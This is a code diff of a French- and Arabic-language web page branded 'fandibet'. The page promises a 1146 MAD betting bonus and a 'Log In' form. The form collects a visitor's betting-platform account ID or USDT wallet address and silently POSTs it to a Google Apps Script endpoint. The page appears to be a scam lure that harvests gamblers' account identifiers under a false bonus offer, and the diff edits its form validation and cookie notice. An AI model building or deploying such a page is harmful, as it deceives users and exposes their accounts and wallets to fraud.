@@ -17,20 +17,15 @@
     .input-group label { font-size:13px; color:#fff; display:flex; align-items:center; gap:6px; flex-wrap:wrap; }
     .required-star { color:#ff3b3b; margin-left:2px; }
     .token-icon { width:18px; height:18px; display:inline-block; vertical-align:middle; }
-
     .input-group select, .input-group input { width:100%; height:34px; border:none; border-radius:4px; background:#dfe4eb; font-size:13px; color:#000; padding:0 8px; box-sizing:border-box; }
     .input-group select:focus, .input-group input:focus { outline:none; box-shadow:none; }
-
     .login-btn { margin-top:30px; width:100%; height:46px; background:#28c76f; border:none; border-radius:6px; color:#000; font-size:15px; font-weight:500; cursor:pointer; display:flex; align-items:center; justify-content:center; position:relative; }
     .spinner { width:20px; height:20px; border:3px solid rgba(0,0,0,0.2); border-top:3px solid #000; border-radius:50%; animation: spin 0.8s linear infinite; }
     @keyframes spin { 0%{transform:rotate(0)} 100%{transform:rotate(360deg)} }
-
     .platform-tags { margin:10px auto 5px auto; width:95%; max-width:360px; display:flex; flex-wrap:wrap; justify-content:center; gap:4px; }
     .platform-tags span { background:#1c1c1c; color:#28c76f; font-size:11px; padding:4px 8px; border-radius:12px; opacity:0.85; }
-
     .footer-text { text-align:center; font-size:12px; line-height:1.6; margin-top:5px; margin-bottom:10px; color:#fff; }
     .footer-text a { color:#28c76f; text-decoration:none; }
-
     .disabled * { pointer-events:none; opacity:0.6; }
   </style>
 </head>
@@ -38,17 +33,14 @@
   <header>
     <div class="logo" translate="no">fandibet</div>
   </header>
-
   <div class="bonus" translate="no">Crédit d'un bonus d'un montant de 1146 MAD</div>
   <div class="bonus-offer" translate="no">100% DE BONUS SUR VOTRE PREMIER DEPOSIT</div>
   <div class="big-login" translate="no">Log In</div>
-
   <div class="container">
     <div class="form-box" id="formBox">
       <div class="input-group">
         <label for="platform" translate="no">Plateforme <span class="required-star">*</span></label>
         <select id="platform" name="platform" translate="no">
-          <option value="" selected disabled></option>
           <option>Betwinner</option>
           <option>888Starz</option>
           <option>Xparibet</option>
@@ -63,22 +55,22 @@
       </div>
       <div class="input-group">
         <label id="account-label" for="account" translate="no">Numéro de compte ID: <span class="required-star">*</span></label>
-        <input type="text" id="account" name="account" translate="no" maxlength="15" disabled />
+        <input type="text" id="account" name="account" translate="no" maxlength="15" />
       </div>
       <button class="login-btn" type="button" id="loginBtn" onclick="sendData()">
         <span id="btnText">Log In</span>
       </button>
     </div>
   </div>
-
   <div class="platform-tags" translate="no">
     <span>Betwinner</span><span>888Starz</span><span>Xparibet</span><span>MelBet</span><span>1xBet</span><span>LINEBET</span><span>Mega Pari</span><span>Gooobet</span><span>Stake</span><span>MyStake</span>
   </div>
-
   <div class="footer-text">
-    © 2019 - 2025 "fandibet" All rights reserved.
+    يستخدم <strong>fandibet</strong> ملفات تعريف الارتباط لضمان حصولك على أفضل تجربة مستخدم.<br>
+    بمواصلة تصفح الموقع، فإنك توافق على استخدام ملفات تعريف الارتباط على <strong>fandibet</strong>.<br>
+    <a href="#">تعرّف على المزيد</a><br><br>
+    © 2019 - 2025 "fandibet" جميع الحقوق محفوظة.
   </div>
-
   <script>
     const platformSelect = document.getElementById('platform');
     const accountLabel = document.getElementById('account-label');
@@ -88,12 +80,11 @@
     const accountInput = document.getElementById("account");
 
     platformSelect.addEventListener('change', function() {
-      accountInput.disabled = false;
       const value = this.value.toLowerCase();
       if (value === 'stake' || value === 'mystake') {
         accountLabel.innerHTML = `Wallet Address <span class="required-star">*</span> <img src="https://i.postimg.cc/W3GvcnjM/Tgxt-DYbk2-IOs-BCx-UFUr5ksc-D2-Fjm2lv-LBRK2dr-PR.png" class="token-icon" alt="USDT"> Tether USD (ERC20)`;
         accountInput.value = "";
-        accountInput.setAttribute("maxlength", "200"); 
+        accountInput.removeAttribute("maxlength");
         accountInput.oninput = function() {
           this.value = this.value.replace(/[\u0600-\u06FF]/g, '');
         };
@@ -111,14 +102,19 @@
     async function sendData() {
       const platform = platformSelect.value;
       const account = accountInput.value;
-      if (!platform || !account) return;
       if (platform !== "Stake" && platform !== "MyStake") {
-        if (account.length < 4 || account.length > 15) return;
+        if (account.length < 4 || account.length > 15) {
+          return;
+        }
       }
+      if (!platform || !account) return;
+
       formBox.classList.add("disabled");
       btnText.style.display = "none";
       loginBtn.innerHTML = '<div class="spinner"></div>';
+
       const data = { platform, account };
+
       try {
         await fetch("https://script.google.com/macros/s/AKfycbz7MooJyUYwNZyWdaNJwWTz4wDNnXt8-TpaXbJk2R787VaBpLG4hK6WW1KbZkzAFSS-Cw/exec", {
           method: "POST",
@@ -126,11 +122,16 @@
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(data)
         });
-      } catch (error) {} finally {
+      } catch (error) {
+      } finally {
         platformSelect.value = "";
         accountInput.value = "";
-        accountInput.disabled = true;
         accountLabel.innerHTML = 'Numéro de compte ID: <span class="required-star">*</span>';
+        accountInput.setAttribute("maxlength", "15");
+        accountInput.oninput = function() {
+          this.value = this.value.replace(/\D/g, '');
+          if (this.value.length > 15) this.value = this.value.slice(0, 15);
+        };
         formBox.classList.remove("disabled");
         loginBtn.innerHTML = '<span id="btnText">Log In</span>';
       }
